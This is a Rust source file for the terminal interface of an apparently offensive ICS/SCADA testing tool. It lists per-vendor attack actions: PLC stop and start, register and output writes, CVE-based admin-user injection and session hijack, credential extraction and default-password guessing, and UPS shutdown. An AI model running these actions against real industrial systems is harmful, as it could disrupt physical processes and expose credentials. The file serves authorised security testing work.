//! TUI frontend for scadaver.
//!
//! MQTT topic browser, live message display, and topic table layout were informed by
//! `mqttui` by `EdJoPaTo`: <https://github.com/EdJoPaTo/mqttui>
#![allow(clippy::too_many_lines)]
use crate::db::{Database, DeviceRecord};
use anyhow::Result;
use casket::core::autodetect::{probe_all, DeviceInfo};
use casket::core::network::{get_interfaces, local_ip_for, NetworkInterface};
use casket::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
use casket::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
use ratatui::{
    backend::Backend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, Borders, Clear, List, ListItem, ListState, Paragraph, Wrap},
    Frame, Terminal,
};
use serde_json::Value;
use std::collections::{HashMap, HashSet, VecDeque};
use std::fmt::Write as _;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::time::Duration;

// ─── Background events ───────────────────────────────────────────────────────

enum ScanEvent {
    DeviceFound(DeviceInfo),
    Done(String),
    Output(String),
    MqttLine(String),
    MqttDone(String),
    CredFound {
        ip: String,
        username: String,
        password: String,
    },
    TagLeaves {
        ip: String,
        port: u16,
        vendor: String,
        leaves: Vec<(String, bool)>,
    },
}

#[derive(Clone, Copy, PartialEq, Eq, Default)]
enum ExportFormat {
    #[default]
    Json,
    Csv,
}

// ─── Exploit catalogue ───────────────────────────────────────────────────────

struct ExploitDef {
    label: &'static str,
    needs_input: bool,
    input_hint: &'static str,
    is_monitor: bool,
    requirement: ExploitRequirement,
    risk: ExploitRisk,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExploitRequirement {
    None,
    Capability(CapabilityKey),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum CapabilityKey {
    BeckhoffAds,
    BeckhoffUdpDiscovery,
    BeckhoffWeb,
    S7Tcp,
    SchneiderIdentity,
    SchneiderModbus,
    SchneiderWeb,
    Fc90Classic,
    Fc90Tm221,
    PhoenixInfo,
    PhoenixWebVisit,
    EwonHttp,
    EnipTcp,
    MitsubishiIdentity,
    MitsubishiControlUdp,
    SlmpTcp,
    FinsTcp,
    Iec104Tcp,
    SnmpUdp,
    SnmpWrite,
    SnmpApc,
    MqttTcp,
    BacnetIp,
    Dnp3Tcp,
    OpcuaTcp,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExploitRisk {
    ReadOnly,
    SensitiveRead,
    LongRunning,
    WriteControl,
}

impl ExploitDef {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            needs_input: false,
            input_hint: "",
            is_monitor: false,
            requirement: ExploitRequirement::None,
            risk: ExploitRisk::ReadOnly,
        }
    }
    fn with_input(label: &'static str, hint: &'static str) -> Self {
        Self {
            label,
            needs_input: true,
            input_hint: hint,
            is_monitor: false,
            requirement: ExploitRequirement::None,
            risk: ExploitRisk::ReadOnly,
        }
    }
    fn requires(mut self, requirement: ExploitRequirement) -> Self {
        self.requirement = requirement;
        self
    }
    fn capability(self, capability: CapabilityKey) -> Self {
        self.requires(ExploitRequirement::Capability(capability))
    }
    fn risk(mut self, risk: ExploitRisk) -> Self {
        self.risk = risk;
        self
    }
}

fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
    let mut defs = match vendor.to_lowercase().as_str() {
        "beckhoff" => vec![
            ExploitDef::new("Get TwinCAT Info").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::new("Set State: run")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: config")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Reboot [CVE-2015-4051]")
                .capability(CapabilityKey::BeckhoffWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Add Admin User [CVE-2015-4051]", "username:password")
                .capability(CapabilityKey::BeckhoffWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Read Runtime State").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::with_input("Inject Route [ADS pivot]", "username:password")
                .capability(CapabilityKey::BeckhoffUdpDiscovery)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Enumerate Symbols (ADS)").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::with_input("Write Symbol (ADS)", "SymbolName=hexvalue")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
        ],
        "siemens" => vec![
            ExploitDef::with_input("Read CPU State", "password (empty = stored / no auth)")
                .capability(CapabilityKey::S7Tcp),
            ExploitDef::with_input(
                "Read I/O (inputs/outputs/merkers)",
                "password (empty = stored / no auth)",
            )
            .capability(CapabilityKey::S7Tcp),
            ExploitDef::with_input(
                "Toggle CPU State (run\u{2194}stop)",
                "password (empty = stored / no auth)",
            )
            .capability(CapabilityKey::S7Tcp)
            .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Set Outputs", "01010101")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Set Merkers", "bits:offset")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("List Data Blocks", "password (empty = stored / no auth)")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Data Block", "DB1:0:64").capability(CapabilityKey::S7Tcp),
            ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Try Default Passwords")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::SensitiveRead),
        ],
        "modbus" => vec![
            ExploitDef::new("Map Modbus: Quick").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: Common").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Map Modbus: Custom", "hr:0:500,ir:0:100,co:0:128,di:0:128")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: All")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Holding Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Coils", "0:64").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Input Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Discrete Inputs", "0:64")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Write Coil", "addr:on|off")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Register", "addr:value")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Multiple Registers", "start:v0,v1,...")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
        ],
        "schneider" | "modicon" => vec![
            ExploitDef::new("Flash LED")
                .capability(CapabilityKey::SchneiderIdentity)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input(
                "Session Hijack: get info [CVE-2017-6026]",
                "username (default: Administrator)",
            )
            .capability(CapabilityKey::SchneiderWeb)
            .risk(ExploitRisk::SensitiveRead),
            ExploitDef::with_input(
                "Session Hijack: stop PLC [CVE-2017-6026]",
                "username (default: Administrator)",
            )
            .capability(CapabilityKey::SchneiderWeb)
            .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input(
                "Session Hijack: run PLC [CVE-2017-6026]",
                "username (default: Administrator)",
            )
            .capability(CapabilityKey::SchneiderWeb)
            .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Map Modbus: Quick").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: Common").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Map Modbus: Custom", "hr:0:500,ir:0:100,co:0:128,di:0:128")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: All")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Holding Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Coils", "0:64").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Input Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Discrete Inputs", "0:64")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Write Coil", "addr:on|off")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Register", "addr:value")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Multiple Registers", "start:v0,v1,...")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Stop PLC [M340/Quantum]")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Start PLC [M340/Quantum]")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Stop TM221")
                .capability(CapabilityKey::Fc90Tm221)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Start TM221")
                .capability(CapabilityKey::Fc90Tm221)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("FC90 Force Output", "byte:on|off|unforce")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
        ],
        "phoenix" => vec![
            ExploitDef::new("Get Passwords [CVE-2016-8366]")
                .capability(CapabilityKey::PhoenixWebVisit)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("List Tags [CVE-2016-8380]").capability(CapabilityKey::PhoenixWebVisit),
            ExploitDef::new("Read Tag Values [CVE-2016-8380]")
                .capability(CapabilityKey::PhoenixWebVisit),
            ExploitDef::with_input("Write Tag [CVE-2016-8380]", "TagName=value")
                .capability(CapabilityKey::PhoenixWebVisit)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Get Device Info (ProConOS)").capability(CapabilityKey::PhoenixInfo),
            ExploitDef::with_input("Control ILC150", "stop|run:cold|warm|hot")
                .capability(CapabilityKey::PhoenixInfo)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Control ILC390", "stop|run")
                .capability(CapabilityKey::PhoenixInfo)
                .risk(ExploitRisk::WriteControl),
        ],
        "ewon" => vec![
            ExploitDef::with_input("Extract Credentials (auth bypass)", "adm:20")
                .capability(CapabilityKey::EwonHttp)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("List Tags")
                .capability(CapabilityKey::EwonHttp)
                .risk(ExploitRisk::SensitiveRead),
        ],
        "rockwell" | "enip" => vec![
            ExploitDef::new("Get Device Identity").capability(CapabilityKey::EnipTcp),
            ExploitDef::new("List Tags")
                .capability(CapabilityKey::EnipTcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Tag", "TagName").capability(CapabilityKey::EnipTcp),
            ExploitDef::with_input("Write Tag", "TagName=hexvalue")
                .capability(CapabilityKey::EnipTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "mitsubishi" => vec![
            ExploitDef::new("Get Device Info (SLMP)").capability(CapabilityKey::MitsubishiIdentity),
            ExploitDef::new("Map SLMP: Quick").capability(CapabilityKey::SlmpTcp),
            ExploitDef::new("Map SLMP: Common").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Map SLMP: Custom", "d:0:100,m:0:128")
                .capability(CapabilityKey::SlmpTcp),
            ExploitDef::new("Map SLMP: All")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::new("Set State: run")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: stop")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: pause")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Read D Registers", "0:50").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Read M Bits", "0:64").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Write D Registers", "start:v0,v1,...")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write M Bits", "start:0101...")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "omron" => vec![
            ExploitDef::new("Get Device Info (FINS)").capability(CapabilityKey::FinsTcp),
            ExploitDef::with_input("Read DM Words", "start:count")
                .capability(CapabilityKey::FinsTcp),
            ExploitDef::with_input("Write DM Words", "start:v0,v1,...")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("CPU Status").capability(CapabilityKey::FinsTcp),
            ExploitDef::new("CPU Run")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("CPU Stop")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "iec104" => vec![
            ExploitDef::new("General Interrogation").capability(CapabilityKey::Iec104Tcp),
            ExploitDef::with_input("Single Command ON", "ioa")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Single Command OFF", "ioa")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Double Command", "ioa:state")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "snmp" => vec![
            ExploitDef::with_input(
                "System Info (sysDescr / OID / uptime)",
                "read community (empty = auto-discover)",
            )
            .capability(CapabilityKey::SnmpUdp),
            ExploitDef::with_input(
                "Interface Table (MAC / speed / errors)",
                "read community (empty = auto-discover)",
            )
            .capability(CapabilityKey::SnmpUdp),
            ExploitDef::with_input(
                "Network Topology (IP addrs / routes / ARP)",
                "read community (empty = auto-discover)",
            )
            .capability(CapabilityKey::SnmpUdp),
            ExploitDef::new("Community Scan (try common strings)")
                .capability(CapabilityKey::SnmpUdp)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::with_input(
                "CVE Probe (match sysDescr → advisories)",
                "read community (empty = auto-discover)",
            )
            .capability(CapabilityKey::SnmpUdp),
            ExploitDef::with_input(
                "Walk OID Subtree",
                "OID [community]  e.g. 1.3.6.1.2.1 public",
            )
            .capability(CapabilityKey::SnmpUdp)
            .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input(
                "Test Write Access (SET sysName → same value)",
                "write community (default: private)",
            )
            .capability(CapabilityKey::SnmpWrite)
            .risk(ExploitRisk::SensitiveRead),
            ExploitDef::with_input(
                "APC UPS: Status (battery / load / runtime)",
                "read community (empty = auto-discover)",
            )
            .capability(CapabilityKey::SnmpApc),
            ExploitDef::with_input(
                "APC UPS: Graceful Shutdown [DESTRUCTIVE]",
                "write community (default: private)",
            )
            .capability(CapabilityKey::SnmpApc)
            .risk(ExploitRisk::WriteControl),
        ],
        "bacnet" => vec![
            ExploitDef::new("Device Info").capability(CapabilityKey::BacnetIp),
            ExploitDef::new("Property Dump").capability(CapabilityKey::BacnetIp),
            ExploitDef::new("Who-Is Broadcast").capability(CapabilityKey::BacnetIp),
        ],
        "dnp3" => vec![
            ExploitDef::new("Device Attributes").capability(CapabilityKey::Dnp3Tcp),
            ExploitDef::new("Integrity Poll").capability(CapabilityKey::Dnp3Tcp),
        ],
        "opcua" => vec![
            ExploitDef::new("Server Info").capability(CapabilityKey::OpcuaTcp),
            ExploitDef::new("Enumerate Endpoints").capability(CapabilityKey::OpcuaTcp),
            ExploitDef::with_input("Try Auth Bypass", "endpoint index (default 0)")
                .capability(CapabilityKey::OpcuaTcp),
        ],
        "mqtt" => vec![
            ExploitDef::with_input("Publish", "topic:payload")
                .risk(ExploitRisk::WriteControl)
                .capability(CapabilityKey::MqttTcp),
            ExploitDef::new("List Topics")
                .risk(ExploitRisk::SensitiveRead)
                .capability(CapabilityKey::MqttTcp),
        ],
        _ => vec![ExploitDef::new("Auto-detect / rescan")],
    };
    defs.push(ExploitDef::new("\u{2190} Return"));
    defs
}

const ALL_VENDORS: &[&str] = &[
    "siemens",
    "beckhoff",
    "rockwell",
    "enip",
    "schneider",
    "modicon",
    "modbus",
    "mitsubishi",
    "phoenix",
    "omron",
    "ewon",
    "snmp",
    "iec104",
    "bacnet",
    "dnp3",
    "opcua",
    "mqtt",
];

const SCAN_ITEMS: &[&str] = &[
    "All vendors (parallel broadcast)",
    "Beckhoff TwinCAT   (UDP 48899)",
    "EtherNet/IP CIP    (UDP 44818)",
    "Schneider Electric (UDP 1740 broadcast)",
    "Mitsubishi MELSEC  (UDP 5561)",
    "eWON IPCONF        (UDP 1507)",
    "Modbus TCP         (port 502 /24 sweep)",
    "\u{2190} Return",
];

const SCAN_BACK_IDX: usize = SCAN_ITEMS.len() - 1;

#[derive(Debug, Clone)]
struct TargetScan {
    ip: String,
    port: Option<u16>,
    transport: Option<TargetTransport>,
    vendor: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TargetTransport {
    Udp,
    Tcp,
    Both,
}

impl TargetScan {
    fn new(ip: String) -> Self {
        Self {
            ip,
            port: None,
            transport: None,
            vendor: None,
        }
    }

    fn label(&self) -> String {
        let port = self.port.map_or(String::new(), |p| format!(":{p}"));
        let transport = self
            .transport
            .map_or(String::new(), |t| format!(" {}", target_transport_label(t)));
        let vendor = self
            .vendor
            .as_deref()
            .map_or(String::new(), |v| format!(" {v}"));
        format!("{}{}{}{}", self.ip, port, transport, vendor)
    }

    fn should_try_schneider(&self) -> bool {
        matches!(self.vendor.as_deref(), Some("schneider" | "modicon"))
            || (self.vendor.is_none() && (self.port.is_some() || self.transport.is_some()))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SchneiderFamily {
    ClassicFc90,
    Tm221,
    Unknown,
}

impl SchneiderFamily {
    fn as_field(self) -> &'static str {
        match self {
            Self::ClassicFc90 => "m340_quantum_premium",
            Self::Tm221 => "tm221",
            Self::Unknown => "unknown",
        }
    }

    fn from_field(value: Option<&str>) -> Self {
        match value.unwrap_or_default() {
            "m340_quantum_premium" => Self::ClassicFc90,
            "tm221" => Self::Tm221,
            _ => Self::Unknown,
        }
    }

    fn from_name(name: &str) -> Self {
        let name = name.to_ascii_lowercase();
        if name.contains("tm221") {
            Self::Tm221
        } else if name.contains("m340")
            || name.contains("quantum")
            || name.contains("premium")
            || name.contains("m580")
        {
            Self::ClassicFc90
        } else {
            Self::Unknown
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::ClassicFc90 => "M340/Quantum/Premium",
            Self::Tm221 => "TM221",
            Self::Unknown => "unknown",
        }
    }
}

#[derive(Debug, Clone)]
struct SchneiderCapabilities {
    identity_confirmed: bool,
    udp_discovery_confirmed: bool,
    modbus_tcp_confirmed: bool,
    modbus_port: u16,
    web_port: Option<u16>,
    fc90_family: SchneiderFamily,
}

impl SchneiderCapabilities {
    fn from_device(dev: &DeviceRecord) -> Self {
        let fields = &dev.fields;
        let cap_identity = field_bool(fields, "cap_identity_confirmed");
        let cap_udp = field_bool(fields, "cap_schneider_udp");
        let cap_modbus = field_bool(fields, "cap_modbus_tcp");
        let name = field_str(fields, "name").unwrap_or_default();
        let protocol = field_str(fields, "protocol").unwrap_or_default();
        let discovery_transport = field_str(fields, "discovery_transport").unwrap_or_default();
        let identity_name = is_schneider_identity_name(name);
        let identity_confirmed = cap_identity
            || identity_name
            || (discovery_transport == "udp" && !name.is_empty() && !name.contains("compatible"));
        let udp_discovery_confirmed =
            cap_udp || (discovery_transport == "udp" && identity_confirmed);
        let modbus_tcp_confirmed = cap_modbus
            || protocol == "modbus_tcp"
            || (discovery_transport == "tcp" && field_port_value(fields, "modbus_port").is_some());
        let modbus_port =
            field_port_value(fields, "modbus_port").unwrap_or(casket::core::modbus::DEFAULT_PORT);
        let web_port = field_port_value(fields, "web_port");
        let fc90_family = SchneiderFamily::from_field(field_str(fields, "fc90_family"))
            .max_confidence(SchneiderFamily::from_name(name));

        Self {
            identity_confirmed,
            udp_discovery_confirmed,
            modbus_tcp_confirmed,
            modbus_port,
            web_port,
            fc90_family,
        }
    }

    fn web_candidate(&self) -> bool {
        self.identity_confirmed || self.web_port.is_some()
    }
}

impl SchneiderFamily {
    fn max_confidence(self, fallback: Self) -> Self {
        if self == Self::Unknown {
            fallback
        } else {
            self
        }
    }
}

#[derive(Clone)]
struct PendingExploit {
    vendor: String,
    idx: usize,
    ip: String,
    port: u16,
    input: String,
    label: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ActionAvailability {
    enabled: bool,
    reason: Option<&'static str>,
}

// ─── App state ───────────────────────────────────────────────────────────────

#[derive(Clone, PartialEq)]
enum Mode {
    Normal,
    IpInput,
    ScanMenu,
    ExploitMenu,
    ExploitInput,
    ExploitConfirm,
    VendorPicker,
    Search,
    Help,
    References,
    OutputZoom,
    CacheRescanPrompt,
    MqttMonitor,
    MqttClientIdInput,
    MqttCredInput,
    #[allow(dead_code)]
    ImportInput,
    WordlistInput,
}

/// MQTT connection settings configurable before connecting.
#[derive(Clone, Copy)]
struct MqttConnSettings {
    tls: bool,
    version: MqttVersion,
}

impl Default for MqttConnSettings {
    fn default() -> Self {
        Self {
            tls: false,
            version: MqttVersion::V311,
        }
    }
}

/// Saved output state for one device — swapped in/out as the selection changes.
#[derive(Default)]
struct DeviceOutput {
    output_lines: Vec<String>,
    output_scroll: usize,
    tag_leaves: Vec<(String, bool)>,
    tag_leaf_line_indices: Vec<(usize, usize)>,
    output_leaf_cursor: Option<usize>,
    output_line_backup: Option<Vec<String>>,
    tag_write_ip: String,
    tag_write_port: u16,
    tag_write_vendor: String,
    scan_timestamp: Option<std::time::Instant>,
}

#[allow(clippy::struct_excessive_bools)]
pub struct App {
    devices: Vec<DeviceRecord>,
    list_state: ListState,
    mode: Mode,
    zoom_from: Mode,
    quit_confirm: bool,
    monitor_stop: Option<Arc<AtomicBool>>,
    input_buf: String,
    output_lines: Vec<String>,
    output_scroll: usize,
    logs: VecDeque<String>,
    scan_rx: mpsc::Receiver<ScanEvent>,
    scan_tx: mpsc::Sender<ScanEvent>,
    scan_menu_sel: usize,
    exploit_defs: Vec<ExploitDef>,
    exploit_sel: usize,
    exploit_list_state: ListState,
    pending_exploit: Option<PendingExploit>,
    vendor_override: Option<String>,
    vendor_pick_sel: usize,
    filter: String,
    filtered_indices: Vec<usize>,
    active_jobs: u32,
    references_scroll: usize,
    stealth: bool,
    mqtt_session: Option<Arc<Mutex<MqttSession>>>,
    mqtt_broker: String,
    mqtt_topics: Vec<(String, usize, String)>,
    mqtt_retained: HashSet<String>,
    mqtt_total_msgs: usize,
    mqtt_topic_list_state: ListState,
    mqtt_filter: String,
    mqtt_attack_lines: Vec<String>,
    mqtt_attack_scroll: usize,
    mqtt_attack_label: String,
    mqtt_attack_running: bool,
    mqtt_username: String,
    mqtt_password: String,
    mqtt_conn: MqttConnSettings,
    wordlist_path: Option<String>,
    export_format: ExportFormat,
    tag_leaves: Vec<(String, bool)>,
    tag_leaf_line_indices: Vec<(usize, usize)>,
    tag_write_ip: String,
    tag_write_port: u16,
    tag_write_vendor: String,
    output_leaf_cursor: Option<usize>,
    tag_write_pending: bool,
    output_from_cache: bool,
    scan_timestamp: Option<std::time::Instant>,
    output_line_backup: Option<Vec<String>>,
    pending_tag_write: Option<(String, bool)>,
    per_device_output: std::collections::HashMap<String, DeviceOutput>,
    current_output_ip: String,
    output_filter: String,
    output_filter_active: bool,
    output_has_tag_content: bool,
}

impl App {
    pub fn new(db: &Database) -> Self {
        let (tx, rx) = mpsc::channel();
        let devices = db.load_devices().unwrap_or_default();
        let n = devices.len();
        let filtered_indices: Vec<usize> = (0..n).collect();
        let mut list_state = ListState::default();
        if n > 0 {
            list_state.select(Some(0));
        }
        Self {
            devices,
            list_state,
            mode: Mode::Normal,
            zoom_from: Mode::Normal,
            quit_confirm: false,
            monitor_stop: None,
            input_buf: String::new(),
            output_lines: Vec::new(),
            output_scroll: 0,
            logs: VecDeque::with_capacity(200),
            scan_rx: rx,
            scan_tx: tx,
            scan_menu_sel: 0,
            exploit_defs: Vec::new(),
            exploit_sel: 0,
            exploit_list_state: ListState::default(),
            pending_exploit: None,
            vendor_override: None,
            vendor_pick_sel: 0,
            filter: String::new(),
            filtered_indices,
            active_jobs: 0,
            references_scroll: 0,
            stealth: false,
            mqtt_session: None,
            mqtt_broker: String::new(),
            mqtt_topics: Vec::new(),
            mqtt_retained: HashSet::new(),
            mqtt_total_msgs: 0,
            mqtt_topic_list_state: ListState::default(),
            mqtt_filter: String::new(),
            mqtt_attack_lines: Vec::new(),
            mqtt_attack_scroll: 0,
            mqtt_attack_label: String::new(),
            mqtt_attack_running: false,
            mqtt_username: String::new(),
            mqtt_password: String::new(),
            mqtt_conn: MqttConnSettings::default(),
            wordlist_path: None,
            export_format: ExportFormat::default(),
            tag_leaves: Vec::new(),
            tag_write_ip: String::new(),
            tag_write_port: 0,
            tag_write_vendor: String::new(),
            output_leaf_cursor: None,
            tag_leaf_line_indices: Vec::new(),
            tag_write_pending: false,
            output_from_cache: false,
            scan_timestamp: None,
            output_line_backup: None,
            pending_tag_write: None,
            per_device_output: std::collections::HashMap::new(),
            current_output_ip: String::new(),
            output_filter: String::new(),
            output_filter_active: false,
            output_has_tag_content: false,
        }
    }

    fn selected_device(&self) -> Option<&DeviceRecord> {
        let idx = self.filtered_indices.get(self.list_state.selected()?)?;
        self.devices.get(*idx)
    }

    fn selected_device_ip(&self) -> Option<String> {
        self.selected_device().map(|d| d.ip.clone())
    }

    fn selected_vendor(&self) -> Option<String> {
        self.vendor_override
            .clone()
            .or_else(|| self.selected_device().map(|d| d.vendor.clone()))
    }

    fn device_port(&self, default: u16) -> u16 {
        self.field_port(&["port"], default)
    }

    fn field_port(&self, keys: &[&str], default: u16) -> u16 {
        self.selected_device()
            .and_then(|d| {
                keys.iter()
                    .find_map(|key| d.fields.get(*key)?.as_u64())
                    .and_then(|n| u16::try_from(n).ok())
            })
            .unwrap_or(default)
    }

    fn action_port(&self, vendor: &str, idx: usize) -> u16 {
        match vendor.to_ascii_lowercase().as_str() {
            "beckhoff" => match idx {
                0 | 1 | 2 | 5 | 7 | 8 => self.field_port(
                    &["ads_port", "port"],
                    casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT,
                ),
                3 | 4 => self.field_port(
                    &["web_port"],
                    casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT,
                ),
                _ => self.device_port(0),
            },
            "mitsubishi" => match idx {
                0..=4 | 8..=11 => self.field_port(
                    &["slmp_port", "port"],
                    casket::vendors::mitsubishi::slmp::DEFAULT_PORT,
                ),
                _ => self.device_port(0),
            },
            "schneider" | "modicon" => match idx {
                1..=3 => self.field_port(&["web_port"], 80),
                4..=19 => {
                    self.field_port(&["modbus_port", "port"], casket::core::modbus::DEFAULT_PORT)
                }
                _ => self.device_port(0),
            },
            "siemens" => self.field_port(&["s7_port", "port"], 102),
            "rockwell" | "enip" => self.field_port(&["enip_port", "port"], 44818),
            "phoenix" => match idx {
                0..=3 => self.field_port(&["webvisit_port", "http_port", "web_port"], 80),
                4 => self.field_port(&["phoenix_info_port", "port"], 1962),
                5 => self.field_port(&["phoenix_ilc150_port"], 0),
                6 => self.field_port(&["phoenix_ilc390_port"], 0),
                _ => self.device_port(0),
            },
            "ewon" => self.field_port(&["http_port", "web_port", "port"], 80),
            "omron" => self.field_port(
                &["fins_port", "port"],
                casket::vendors::omron::fins::FINS_TCP_PORT,
            ),
            "iec104" => self.field_port(
                &["iec104_port", "port"],
                casket::vendors::iec104::client::IEC104_PORT,
            ),
            "snmp" => self.field_port(
                &["snmp_port", "port"],
                casket::vendors::snmp::client::SNMP_PORT,
            ),
            _ => self.device_port(0),
        }
    }

    fn rebuild_filtered(&mut self) {
        if self.filter.is_empty() {
            self.filtered_indices = (0..self.devices.len()).collect();
        } else {
            let q = self.filter.to_lowercase();
            self.filtered_indices = self
                .devices
                .iter()
                .enumerate()
                .filter(|(_, d)| {
                    d.ip.to_lowercase().contains(&q) || d.vendor.to_lowercase().contains(&q)
                })
                .map(|(i, _)| i)
                .collect();
        }
        let n = self.filtered_indices.len();
        if n == 0 {
            self.list_state.select(None);
        } else {
            let cur = self.list_state.selected().unwrap_or(0).min(n - 1);
            self.list_state.select(Some(cur));
        }
    }

    fn reload(&mut self, db: &Database) {
        self.devices = db.load_devices().unwrap_or_default();
        self.rebuild_filtered();
    }

    fn log(&mut self, msg: impl Into<String>) {
        if self.logs.len() >= 200 {
            self.logs.pop_front();
        }
        self.logs.push_back(msg.into());
    }

    fn select_next(&mut self) {
        let n = self.filtered_indices.len();
        if n == 0 {
            return;
        }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some((i + 1).min(n - 1)));
    }

    fn select_prev(&mut self) {
        if self.filtered_indices.is_empty() {
            return;
        }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some(i.saturating_sub(1)));
    }

    fn drain_scan_events(&mut self, db: &Database) {
        while let Ok(ev) = self.scan_rx.try_recv() {
            match ev {
